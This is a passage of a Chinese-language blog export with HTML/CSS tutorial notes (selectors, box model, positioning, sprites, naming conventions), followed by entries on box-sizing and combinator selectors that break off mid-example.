#main,.first,span,a,h1{color:red;} 包含选择器 选择某元素的后代元素，也称后代选择器，父类与子类间以空格隔开p span{color:red;} 属性选择器 选择包含某一属性的元素 a[title]{color:red;} 选择包含title的a标签 a[title][href]{color:red;} 选择包含title和href的a标签 &gt; + 选择器子类选择器：只选择子元素（只选择儿子）（相当于包含元素） p &gt; span{color:red;} 相邻兄弟选择器：只选择后面的相邻兄弟元素 p + span{color:red;} 第十章 css选择器(下) &lt;a&gt;伪类选择器 a:link {color:#FF0000;} / 未访问的链接 / （只用于a标签） a:visited {color:#00FF00;} / 已访问的链接 / （只用于a标签） a:hover {color:#FF00FF;}/* 鼠标移动到链接上 */（可和其他标签结合一起用） a:active {color:#0000FF;} / 选定的链接 / 注意 伪类选择器的排序很重要，a:link a:visited a:hover a:active，记作lvha 输入伪类选择器（针对表单） input:focus{color:red;} / 键盘输入焦点 / 其他伪类选择器 p:first-child{color:red;} /* 第一个p */ :before 在元素之前添加内容。 :after 在元素之后添加内容。 css优先规则 内联样式表-&gt; ID 选择器—&gt; Class 类选择器-&gt;标签选择器 第十一章 背景属性 背景属性： 背景的添加 ： 背景颜色的添加: background:red; backgronnd-color:red; 背景图片的添加： background:url(“images/1.jpg”); backgronnd-image:url(“images/1.jpg”); 背景的平铺 什么是平铺？平铺就是图片是否重复出现 不平铺：background-repeat:no-repeat; 水平方向平铺：background-repeat:repeat-x; 垂直方向平铺：background-repeat:repeat-y; 完全平铺：默认为完全平铺 背景图片的定位 背景图片的定位就是可以设置显示背景图片的位置，通过属性background-position来实现 background-position的取值可为英文单词或者数值和百分值。 background-positon的英文单词取值 top left top center top right center left center center center right bottom left bottom center ottom right background-positon的数值取值 background-position:x y; positon的百分值取值 background-position:x% y%; 背景图片的大小 背景图片的大小可以通过属性background-size来设置background-size的取值可为数值和百分值。 background-size的数值取值 background-size:x y; background-size的数值取值 background-size:x% y%; 背景图片的滚动 背景图片是否随着内容的滚动而滚动由background-attachment设置 background-attachment:fixed; 固定，不随内容的滚动而滚动 background-attachment:scroll; 滚动，随内容的滚动而滚动 第十二章 文字文本属性 css文字文本属性： 文字属性 color:red; 文字颜色 font-size:12px; 文字大小 font-weight:“bold” 文字粗细(bold/normal) font-family:“宋体” 文字字体 font-variant:small-caps小写字母以大写字母显示 文本属性 text-align:center; 文本对齐(right/left/center) line-height:10px; 行间距(可通过它实现文本的垂直居中) text-indent:20px; 首行缩进 text-decoration:none; 文本线(none/underline/overline/line-through) letter-spacing: 字间距 第十三章 盒子模型 盒子模型 盒子模型就是一个有高度和宽度的矩形区域 所有html标签都是盒子模型 div标签自定义盒子模型 所有的标签都是盒子模型 class和id的主要差别是：class用于元素组（类似的元素，或者可以理解为某一类元素），而id用于标识单独的唯一的元素。 盒子模型的组成 盒子模型组成部分： 自身内容：width、height 宽高 内边距： padding 盒子边框： border 边框线 与其他盒子距离： margin外边距 内容+内边距+边框+外边距=面积 border 边框 常见写法 border:1px solid #f00; 单独属性： border-width: border-style: dotted 点状虚线 dashed（虚线） solid（实线） double（双实线） border-color (颜色) padding 内边距 值：像素/厘米等长度单位、百分比 padding:10px; 上下左右 padding:10px 10px; 上下 左右 padding:10px 10px 10px; 上 左右 下 padding:10px 10px 10px 10px; 上 右 下 左（设置4个点–&gt;顺时针方向） 单独属性： padding-top: padding-right: padding-bottom: padding-left: 当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小 margin 外边距 值：与padding相同 单独属性：与padding相同 外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并 补充盒子模型内容 标准盒子模型 盒子模型是css中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 ie盒子模型和标准 w3c 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型 从上图可以看到标准 w3c 盒子模型的范围包括 margin、border、padding、content，并且 content部分不包含其他部分 IE盒子模型 从上图可以看到 ie盒子模型的范围也包括 margin、border、padding、content 和标准 w3c 盒子模型不同的是：ie 盒子模型的 content 部分包含了 border和 padding IE盒子模型width = padding+border+内容 标准盒子模型 = 内容的宽度（不包含border+padding） 例： 一个盒子的 margin为 20px，border 为 1px，padding为 10px，content 的宽为 200px、高为 50px，假如用标准 w3c 盒子模型解释，那么这个盒子需要占据的位置为：宽 20*2+1*2+10*2+200=262px、高 20*2+1*2*10*2+50=112px，盒子的实际大小为：宽 1*2+10*2+200=222px、高 1*2+10*2+50=72px；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 20*2+200=240px、高 20*2+50=70px，盒子的实际大小为：宽 200px、高 50px 那应该选择哪中盒子模型呢？当然是“标准 w3c 盒子模型”了。怎么样才算是选择了“标准 w3c盒子模型”呢？很简单，就是在网页的顶部加上 doctype 声明。 假如不加doctype 声明，那么各个浏览器会根据自己的行为去理解网页，即 ie浏览器会采用 ie 盒子模型去解释你的盒子，而 ff会采用标准w3c 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。 反之，假如加上了 doctype 声明，那么所有浏览器都会采用标准 w3c盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。 用 jquery 做的例子来证实一下 123456789101112&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是？&lt;/title&gt;&lt;script language=&quot;javascript&quot; src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;var sbox = $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 上面的代码没有加上 doctype 声明，在 ie 浏览器中显示 ie盒子模型，在 ff 浏览器中显示“标准w3c 盒子模型”。 12345678910111213&lt;!doctype html public &quot;-//w3c//dtd xhtml 1.0 transitional//en&quot; &quot;http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是标准w3c盒子模型&lt;/title&gt;&lt;script language=&quot;javascript&quot; src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;var sbox = $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 代码2 与代码1 唯一的不同的就是顶部加了 doctype声明。在所有浏览器中都显示“标准 w3c盒子模型” 所以为了让网页能兼容各个浏览器，让我们用标准 w3c 盒子模型 扩展 学会使用box-sizing布局 第十四章 块元素、行元素与溢出 基本概念 块级元素：默认情况下独占一行的元素，可控制宽高、上下边距； 行内元素：默认情况下一行可以摆放多个的元素，不可控制宽高和上下边距 行块转换 display:none; 不显示 display:block; 变成块级元素 display:inline; 变成行级元素 display:inline-block; 以块级元素样式展示，以行级元素样式排列 溢出 overflow:hidden; 溢出隐藏 overflow:scroll; 内容会被修剪，浏览器会显示滚动条 overflow:auto; 如果内容被修剪，则产生滚动条 文本不换行：white-space:nowrap; 长单词换行：word-wrap:break-word; 行内元素和快级元素小结 一、块级元素：block element 每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（float浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素； 块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。 DIV 是最常用的块级元素，元素样式的display:block都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。 二、行内元素：inline element 也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 SPAN元素，IFRAME元素和元素样式的display : inline的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。 三、block（块）元素的特点: ①、总是在新行上开始； ②、高度，行高以及外边距和内边距都可控制； ③、宽度缺省是它的容器的100%，除非设定一个宽度。 ④、它可以容纳内联元素和其他块元素 四、inline元素的特点 ①、和其他元素都在一行上； ②、高，行高及外边距和内边距不可改变； ③、宽度就是它的文字或图片的宽度，不可改变 ④、内联元素只能容纳文本或者其他内联元素 对行内元素，需要注意如下: 设置宽度width 无效。 设置高度height无效，可以通过line-height来设置。 设置margin 只有左右margin有效，上下无效。 设置padding只有左右padding有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。 五、常见的块状元素 address – 地址 blockquote – 块引用 center – 举中对齐块 dir – 目录列表 div – 常用块级容易，也是CSS layout的主要标签 dl – 定义列表 fieldset – form控制组 form – 交互表单 h1 – 大标题 h2 – 副标题 h3 – 3级标题 h4 – 4级标题 h5 – 5级标题 h6 – 6级标题 hr – 水平分隔线 isindex – input prompt menu – 菜单列表 noframes – frames可选内容，（对于不支持frame的浏览器显示此区块内容 noscript – 可选脚本内容（对于不支持script的浏览器显示此内容） ol – 有序表单 p – 段落 pre – 格式化文本 table – 表格 ul – 无序列表 六、常见的内联元素 a – 锚点 abbr – 缩写 acronym – 首字 b – 粗体(不推荐) bdo – bidi override big – 大字体 br – 换行 cite – 引用 code – 计算机代码(在引用源码的时候需要) dfn – 定义字段 em – 强调 font – 字体设定(不推荐) i – 斜体 img – 图片 input – 输入框 kbd – 定义键盘文本 label – 表格标签 q – 短引用 s – 中划线(不推荐) samp – 定义范例计算机代码 select – 项目选择 small – 小字体文本 span – 常用内联容器，定义文本内区块 strike – 中划线 strong – 粗体强调 sub – 下标 sup – 上标 textarea – 多行文本输入框 tt – 电传文本 u – 下划线 七，可变元素 可变元素为根据上下文语境决定该元素为块元素或者内联元素。 applet - java applet button - 按钮 del- 删除文本 iframe - inline frame ins - 插入的文本 map - 图片区块(map) object - object对象 script - 客户端脚本 八、行内元素与块级元素有什么不同 区别一： 块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度 行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。 区别二： 块级：块级元素可以设置宽高 行内：行内元素不可以设置宽高 区别三： 块级：块级元素可以设置margin，padding 行内：行内元素水平方向的margin-left; margin-right; padding-left; padding-right;可以生效。但是竖直方向的margin-bottom; margin-top; padding-top; padding-bottom;却不能生效。 区别四： 块级：display:block; 行内：display:inline; 替换元素有如下：（和img一样的设置方法） &lt;img&gt;、&lt;input&gt;、&lt;textarea&gt;、&lt;select&gt; &lt;object&gt;都是替换元素，这些元素都没有实际的内容 可以通过修改display属性来切换块级元素和行内元素 第十五章 定位 static静态定位（不对它的位置进行改变，在哪里就在那里） 默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者 z-index 声明）。 fixed固定定位（参照物–浏览器窗口）—做 弹窗广告用到 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot;以及 &quot;bottom&quot;属性进行规定。 relative（相对定位 ）（参照物以他本身） 生成相对定位的元素，相对于其正常位置进行定位。 absolute（绝对定位）(除了static都可以，找到参照物–&gt;与它最近的已经有定位的父元素进行定位) 生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。 元素的位置通过 “left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定 z-index z-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。 定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。 一切皆为框 块级元素: div、h1或p元素 即：显示为一块内容称之为 “块框“ ; 行内元素: span,strong,a等元素 即：内容显示在行中称 “行内框”; 使用display属性改变成框的类型 即：display:block; 让行内元素设置为块级元素，display:none; 没有框 相对定位： 如果对一个元素进行相对定位，它将出现在它所在的位置上。 通过设置垂直或水平位置，让这个元素“相对于”它的起点进行移动 .adv_relative { position: relative; left: 30px; top: 20px; } 绝对定位： 元素的位置相对于最近的已定位祖先元素，如果元素没有已定位 的祖先元素，它的位置相对于最初的包含块。 .adv_absolute { position: absolute; left: 30px; top: 20px; } 第十六章 框架 frameset框架： &lt;frameset&gt; —- 用来定义一个框架；双标签不能和 &lt;body&gt; 一起使用 rows、cols属性 rows 定义行表示框架有多少行（取值 px/%/ * ） cols 定义列表示框架有多少列（取值px/ %/ * ） frame子框架 &lt;frame&gt; —- 表示框架中的某一个部分；单标签，要跟结束标志 src 显示的网页的路径 name 框架名 frameborder 边框线（取值 0 / 1） &lt;noframes&gt;属性 &lt;noframes&gt; 提供不支持框架的浏览器显示body的内容；双标签 12345678&lt;frameset&gt; &lt;frame src=“” /&gt; &lt;frame src=“” /&gt; &lt;frame src=“” /&gt; &lt;noframes&gt; &lt;body&gt;内容&lt;/body&gt; &lt;/noframes&gt;&lt;/frameset&gt; &lt;iframe&gt;内联框架 iframe元素会创建包含另外一个文档的内联框架（即行内框架） 允许和 body 一起使用 width 宽（取值 px / %） height 高（取值 px / %） name 框架名 frameborder 边框线（取值 0 / 1） src 显示的网页的路径 第十七章 css高级属性 opacity透明属性 opacity 对于IE6/7/，使用filter:alpha(opacity:值;) 值为0-100 对于Webkit，Opera，Firefox，IE9+，使用opacity:值; 值为0-1 对于早期火狐，使用-moz-opacity:值; 值为0-1 所以写透明属性时，一般写法是 12345 &#123; opacity:0.5; filter:alpha(opacity：50);/*0-100*/ -moz-opacity:0.5; /*取值0-1*/--&gt;针对早起版本的火狐兼容问题的解决&#125; border-radius圆角边框属性 向 div 元素添加圆角边框 border-radius:10px; box-shadow阴影属性 box-shadow属性向框添加阴影效果,后面跟4个参数。 box-shadow:0px 0px 10px #000; &lt;embed&gt;属性 是HTML5中新增的标签,媒体嵌入插件标签，可以通过&lt;embed&gt;插入音频或视频 &lt;embed src=“media/music.mp3” /&gt; 格式.mid .wav .mp3等 CSS部分导图总结 原文件下载地址 访问密码 342a css常见简写 css简写速查 第三部分 附录 附录一 DIV命名规范 企业DIV使用频率高的命名方法 网页内容类 标题: title 摘要: summary 箭头： arrow 商标： label 网站标志： logo 转角/圆角：corner 横幅广告： banner 子菜单： subMenu 搜索： search 搜索框： searchBox 登录： login 登录条：loginbar 工具条： toolbar 下拉： drop 标签页： tab 当前的： current 列表： list 滚动： scroll 服务： service 提示信息： msg 热点：hot 新闻： news 小技巧： tips 下载： download 栏目标题： title 热点： hot 加入：joinus 注册： regsiter 指南： guide 友情链接： friendlink 状态： status 版权： copyright 按钮： btn 合作伙伴： partner 投票： vote 左右中：left right center 注释的写法: /* Footer */ 内容区/* End Footer */ id的命名: 页面结构 容器: container 页头：header 内容：content/container 页面主体：main 页尾：footer 导航：nav 侧栏：sidebar 栏目：column 页面外围控制整体布局宽度：wrapper 左右中：left right center 导航 导航：nav 主导航：mainbav 子导航：subnav 顶导航：topnav 边导航：sidebar 左导航：leftsidebar 右导航：rightsidebar 菜单：menu 子菜单：submenu 标题: title 摘要: summary 功能 标志：logo 广告：banner 登陆：login 登录条：loginbar 注册：regsiter 搜索：search 功能区：shop 标题：title 加入：joinus 状态：status 按钮：btn 滚动：scroll 标签页：tab 文章列表：list 提示信息：msg 当前的:current 小技巧：tips 图标: icon 注释：note 指南：guild 服务：service 热点：hot 新闻：news 下载：download 投票：vote 合作伙伴：partner 友情链接：link 版权：copyright class的命名: 颜色:使用颜色的名称或者16进制代码,如 .red { color: red; } .f60 { color: #f60; } .ff8600 { color: #ff8600; } 字体大小,直接使用”font+字体大小”作为名称,如 .font12px { font-size: 12px; } .font9px {font-size: 9pt; } 对齐样式,使用对齐目标的英文名称,如 .left { float:left; } .bottom { float:bottom; } 标题栏样式,使用”类别+功能”的方式命名,如 .barnews { } .barproduct { } 注意事项:: 一律小写; 尽量用英文; 不加中杠和下划线; 尽量不缩写，除非一看就明白的单词. 推荐的 CSS 书写顺序： 显示属性 display list-style position float clear 自身属性 width height margin padding border background 文本属性 color font text-decoration text-align vertical-align white-space other text content 附录二 CSS精灵 CSS精灵原理以及应用 CSS雪碧的基本原理是把你的网站上用到的一些图片整合到一张单独的图片中，从而减少你的网站的HTTP请求数量。 该图片使用CSS background和background-position属性渲染，这也就意味着你的标签变得更加复杂了，图片是在CSS中定义，而非&lt;img&gt;标签。 一个简单的例子： 一张图片作出一个按钮的三个状态 一个链接用CSS做成按钮的样式，我们可以使用同一张图片，完成按钮的三个状态，a:link，a:hover，a:active &lt;a class=&quot;button&quot; href=&quot;#&quot;&gt;链接&lt;/a&gt; 加入右侧的图片为：200px 65px的三个按钮图拼合而成的图片button.png，从上到下一次为按钮的普通、鼠标滑过、鼠标点击的状态。则可以使用CSS进行定义。 12345678910111213141516171819a &#123; display:block; width:200px; height:65px; line-height:65px; /*定义状态*/ text-indent:-2015px; /*隐藏文字*/ background-image:url(button.png); /*定义背景图片*/ background-position:0 0; /*定义链接的普通状态，此时图像显示的是顶上的部分*/&#125;a:hover &#123; background-position:0 -66px; /*定义链接的滑过状态，此时显示的为中间部分，向下取负值*/&#125;a:active &#123; background-position:0 -132px; /*定 义链接的普通状态，此时显示的是底部的部分，向下取负值*/&#125; 更多的CSS雪碧，图片更复杂，背景定位更精确。可能会用到大量的数值 如：background:url(nav.png) -180px 24pxno-repeat; 来达到更精确的定位 优点： 减少加载网页图片时对服务器的请求次数 可以合并多数背景图片和小图标，方便在任何位置使用，这样不同位置的请求只需要调用一个图片，从而减少对服务器的请求次数，降低服务器压力，同时提高了页面的加载速度，节约服务器的流量。 提高页面的加载速度 sprite技术的其中一个好处是图片的加载时间(在有许多 sprite 时，单张图片的加载时间)。由所需图片拼成的一张 GIF图片的尺寸会明显小于所有图片拼合前的大小。单张的 GIF只有相关的一个色表，而单独分割的每一张 GIF 都有自己的一个色表，这就增加了总体的大小。因此，单独的一张 JPEG 或者 PNG sprite 在大小上非常可能比把一张图分成多张得来的图片总尺寸小。 减少鼠标滑过的一些bug IE6不会主动预加载鼠标滑过即a:hover中的背景图片，所以，如果使用多张图片，鼠标滑过会出现闪白的现象。使用CSS雪碧，由于一张图片即可，所以不会出现这种现象。 不足： CSS雪碧的最大问题是内存使用 影响浏览器的缩放功能 拼图维护比较麻烦 使CSS的编写变得困难 CSS 雪碧调用的图片不能被打印 错误得使用 Sprites 影响可访问性 附录三 一些tips解决方案 页面优化实践 从下面的几个方面可以进行页面的优化： 减少请求数 图片合并 CSS文件合并 减少内联样式 避免在 CSS中使用 import 减少文件大小 选择适合的图片格式 图片压缩 CSS 值缩写（Shorthand Property) 文件压缩 页面性能 调整文件加载顺序 减少标签数量 调整选择器长度 尽量使用CSS 制作显示表现 增强代码可读性与可维护性 规范化 语义化 模块化 写DIV+CSS 的一些常识 不要使用过小的图片做背景平铺 这就是为何很多人都不用 1px 的原因，这才知晓。宽高 1px 的图片平铺出一个宽高 200px 的区域，需要 200200=40, 000 次，占用资源 无边框 推荐的写法是 border:none;，哈哈，我一直在用这个。 border:0; 只是定义边框宽度为零，但边框样式、颜色还是会被浏览器解析，占用资源 慎用 通配符 所谓通配符，就是将CSS 中的所有标签均初始化，不管用的不用的，过时的先进的，一视同仁，这样，大大的占用资源。要有选择的初始化标签。 CSS的十六进制颜色代码缩写 习惯了缩写及小写，这才知道，原来不是推荐的写法，为的是减少解析所占用的资源。但同时会增加文件体积。孰优孰劣，有待仔细考证。 样式放头上，脚本放脚下。不内嵌，只外链 坚决不用 CSS表达式 使用 引用样式表，而不是通过@import 导入。 一般来说，PNG比 GIF 要小，小得多。再者，GIF 中有多少颜色是被浪费的，很值得优化。 千万不要在 HTML中缩放图片，一者不好看，二者占资源。 正文字体最好用偶数 12px、14px、16px，效果非常好。特例，15px。 block、ul、ol等上下留出至少一倍行距，左侧至少两倍行距，右侧随意。 段落之间，至少要有一倍行距 强行指定某些元素的 line-height，正文 1.6倍于文字大小，标题1.3倍。 中文标点用全角 英文夹杂在中文中，左右空格，半角。 中文字体的粗体和斜体，远离较好 常用代码片段 雅虎工程师提供的CSS初始化示例代码【仅供参考】 可以在html头文件中直接引用，从而避免浏览器的不兼容带来的错误。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,code,form,fieldset,legend,input,button,textarea,p,blockquote,th,td &#123; margin:0; padding:0; &#125;body &#123; background:#fff; color:#555; font-size:14px; font-family: Verdana, Arial, Helvetica, sans-serif; &#125;td,th,caption &#123; font-size:14px;&#125;h1, h2, h3, h4, h5, h6 &#123; font-weight:normal; font-size:100%; &#125;address, caption,cite, code, dfn, em, strong,th, var &#123; font-style:normal; font-weight:normal;&#125;a &#123; color:#555; text-decoration:none; &#125;a:hover &#123; text-decoration:underline; &#125;img &#123; border:none;&#125;ol,ul,li &#123; list-style:none; &#125;input, textarea, select, button &#123; font:14px Verdana,Helvetica,Arial,sans-serif; &#125;table &#123; border-collapse:collapse; &#125;html &#123; overflow-y: scroll;&#125; .clearfix:after &#123; content: \".\"; display: block; height:0; clear:both; visibility: hidden;&#125;.clearfix &#123; *zoom:1; &#125; mobile meta标签 1&lt;meta name=”viewport” content=”width=320,target-densitydpi=dpi_value,initial-scale=1, user-scalable=no”/&gt; 表格不被撑开 1table-layout: fixed; word-break: break-all;;border-collapse: collapse 不设宽高居中 12345&lt;div id=”abc” style=”display:table;text-align:center;width:100%;height:100%;”&gt; &lt;span style=”background:#f00; display:table-cell; vertical-align:middle;”&gt; &lt;input type=”button” value=”item1″ /&gt; &lt;/span&gt;&lt;/div&gt; 透明度的兼容代码 1234filter:alpha(opacity=50); /*1-100*/-moz-opacity:0.5; /*0-1.0*/-khtml-opacity:0.5; /*0-1.0*/opacity:0.5; /*0-1.0*/ 文字溢出点点省略 123white-space:nowrap;text-overflow:ellipsis;overflow:hidden; 清除浮动的几种方法 方法一：投机取巧法 – 不推荐 直接一个放到当作最后一个子标签放到父标签那儿，此方法屡试不爽，兼容性强 方法二：overflow + zoom方法 –不推荐 .fix{overflow:hidden; zoom:1;} 此方法优点在于代码简洁，涵盖所有浏览器 方法三：after + zoom方法 -推荐–此方法可以说是综合起来最好的方法了 clearfix只应用在包含浮动子元素的父级元素上 12345678.fix&#123;zoom:1;&#125;.fix:after&#123; display:block; content:'clear'; clear:both; line-height:0; visibility:hidden;&#125; 更多代码片段详情 实用的60个CSS代码片段 一些总结 自动继承属性： color font text-align list-style… 非继承属性： background border position… 具有破坏性的元素： float display:none; position:absoblute/fixed/sticky; 具有包裹性的元素： display:inline-block/table-cell position:absolute/fixed/sticky overflow:hidden/scroll 消除图片底部间隙的方法 图片块状化-无基线对齐img{display:block;} 图片底线对齐img{vertical-align:bottom;} 行高足够小 - 基线位置上移.box{line-height:0;} 一些概念 BFC BFC全称”Block Formatting Context” 中文为“块级格式化上下文” 记住这么一句话：BFC元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此 扩展阅读 CSS中的BFC 优雅降级(graceful degradation) 一开始就构建完整的功能，然后再针对低版本浏览器进行兼容 渐进增强 progressive enhancement： 是在浏览器开启JavaScript功能后，如果浏览器版本不支持某些 JavaScript 能力，我们解决这种问题的方式 平稳退化 是在浏览器没有JavaScript功能，或没有开启JavaScript功能情况下，我们解决这种问题的方式； 方案荟萃扩展阅读 关于布局 垂直居中 css完全居中 居中之美 网页中的底部foot定位 页面高度100% textarea高度自适应 多行溢出省略 Retina屏1px线 Flexbugs 其他 IF IE ENDIF条件判断之IE10 Chrome 翻译插件 网页retina优化 常用meta 树状菜单 em vs rem css vs js css解决方案（w3cplus） Textures生成纹理 CSSgram Csscss（检查重复声明等） 附录四 部分工具资源 学会使用Emmet插件快速编码 Emmet常用快捷键 Sublime专题 Sublime常用插件总结 Front-End -Develop -Tools ToolsBox-自己整理的一份工具列表 附录五 编码规范 编码规范 前端规范 web develop standard Web 前端开发规范文档 前端开发规范手册 附录六 进阶学习 DOM编程之API学习 JavaScript基础学习 附录七 其他资源 Github上前端学习资源汇总 WEB 前端开发学习笔记 前端开发工具箱 148个资源让你成为CSS专家 学习CSS布局-经典必看 附录八 常见问题 前端指路 写给前端面试者（w3cplus） 如何成为一名卓越的前端工程师（勾三股四博客） 什么是全栈工程师 如何跟上前端开发的最新前沿 浏览器的工作原理 移动前端开发和 Web 前端开发的区别 大型网站CSS编写与维护 CSS核心技术关键字 性能/规范/实践 如何阅读W3c规范(王晓轩) 如何阅读W3c规范(高博) 雅虎web性能优化军规 权威前端性能指南 高性能css 一些问答社区 quora stackoverflow 知乎 前端乱炖问答区 segmentfault问答区 其他 本文Mardown原文件-欢迎转载","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"},{"name":"XHTML","slug":"XHTML","permalink":"https://ru23.com/tags/XHTML/"}]},{"title":"学会使用box-sizingCSS布局","slug":"2016-09-学会使用box-sizingCSS布局","date":"2016-09-04T09:20:08.000Z","updated":"2018-10-24T03:46:01.924Z","comments":true,"path":"note/b485e090.html","link":"","permalink":"https://ru23.com/note/b485e090.html","excerpt":"盒子模型","text":"盒子模型 关于CSS重要的一个概念就是CSS盒子模型。它控制着页面这些元素的高度和宽度。盒子模型多少会让人产生一些困惑，尤其当涉及到高度和宽度计算的时候。真正盒子的宽度(在页面呈现出来的宽度)和高度，需要加上一些其它的属性，例如： padding + border + width= 盒子的宽度 padding+ border + height = 盒子的高度 这看起来并不是那么直观，那么我们看一个图： 这意味着，如果我们设置一个宽度为200px，而实际呈现的盒子的宽度可能会大于200px(除非没有左右边框和左右补白)。这可能看起来比较怪，CSS设置的宽度仅仅是内容区的宽度，而非盒子的宽度。同样，高度类似 这导致的直接结果是当我们希望页面呈现的盒子的宽度是200px的时候，我们需要减去它的左右边框和左右补白，然后设置为对应的CSS宽度。例如上图，我们设置希望盒子宽度为200px，则需要先减去左右补白各20px，左右边框各1px，然后设置对应的CSS宽度158px。 幸运的是，我们有更好的方法达到我们想要的目的 box-sizing 语法：box-sizing: content-box | border-box | inherit; 与上面不同的是，当你设置box-sizing:border-box以后，这就能达到你想要的目的。例如，上面我们想要一个宽度为200px的盒子，那么我们直接设置宽度为200px。是不是看起来清晰多了。当再设置它的左右边框和左右补白后，它的内容区会自动调整。这可能更直接和一目了然。CSS代码如下： 123456div &#123; box-sizing: border-box; width: 200px; padding: 20px; border: 1px solid #DDD;&#125; 实际上，这更被设计者和开发者推崇 一些开发人员觉得box-sizing使用起来十分方便,所以他们主张通过通用选择器将这个属性应用于每个元素 但这样的观点未免有些偏激,而且还会导致不必要的困难,所以更好的方法是只在实际需要时才使用这个属性 12345*&#123; margin:0; padding:0; box-sizing:border-box;&#125; 写上 box-sizing: border-box; ，设置padding值 也不用担心没有减小宽度值而变形 box-sizing其它的值 content-box 描述：在宽度和高度之外绘制元素的内边距和边框。 border-box 描述：为元素指定的任何内边距和边框都将在已设定的宽度和高度内进行绘制 inherit 描述：继承 父元素 box-sizing属性的值 浏览器兼容性 IE8及以上版本支持该属性，Firefox 需要加上浏览器厂商前缀-moz-，对于低版本的IOS和Android浏览器也需要加上-webkit-。实际上，很多reset.css或者normal.css里都包含如下CSS语句，也是比较赞成的用法： 12345*, *:before, *:after &#123; -moz-box-sizing: border-box; -webkit-box-sizing: border-box; box-sizing: border-box; &#125; box-sizing 布局三栏目案例12345678910111213141516171819div&#123; height:700px; float:left;&#125;div.left&#123; width:25%; background:red;&#125;div.cent&#123; width:50%; box-sizing:border-box;/*可以改变元素以使其宽度包含填充*/ /* 现在整个元素,包括填充在内,占页面总宽度的50%,所以元素的组合宽度为100%,这全程它们很好地适应于它们的容器.*/ background:yellow; padding:0 20px;/*加了这个会使盒子内容溢出 但是box-sizing很好的自适应了*/&#125;div.right&#123; width:25%; background:blue;&#125; 123&lt;div class=\"left\"&gt;&lt;/div&gt;&lt;div class=\"cent\"&gt;&lt;/div&gt;&lt;div class=\"right\"&gt;&lt;/div&gt; 效果","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"CSS 组合选择符用法总结","slug":"2016-09-CSS-组合选择符用法总结","date":"2016-09-04T08:50:32.000Z","updated":"2018-10-24T03:46:01.910Z","comments":true,"path":"note/f8391ae.html","link":"","permalink":"https://ru23.com/note/f8391ae.html","excerpt":"组合选择符基本介绍","text":"组合选择符基本介绍 组合选择符说明了两个选择器直接的关系 CSS组合选择符包括各种简单选择符的组合方式 在 CSS3 中包含了四种组合方式 后代选取器(以空格分隔) 子元素选择器(以大于号分隔） 相邻兄弟选择器（以加号分隔） 普通兄弟选择器（以破折号分隔） 后代选取器 后代选取器匹配所有值得元素的后代元素 实例： 12345&lt;div&gt; &lt;p&gt;我是通过后代选择器选择的元素&lt;/p&gt; &lt;h1&gt;002&lt;/h1&gt; &lt;p&gt;我是通过后代选择器选择的元素&lt;/p&gt;&lt;/div&gt; 123div p&#123; background:red;&#125; 效果： 子元素选择器 如果您不希望选择任意的后代元素，而是希望缩小范围，只选择某个元素的子元素，请使用子元素选择器 html代码的文档树结构如图 123456&lt;div class=\"mainDiv\"&gt; 我是主DIV &lt;div class=\"son\"&gt;儿子 &lt;div class=\"sunzi\"&gt;孙子&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1234567891011.mainDiv&#123; background:yellow; width:100px; height:100px;&#125;.sunzi&#123; background:red; width:40px; 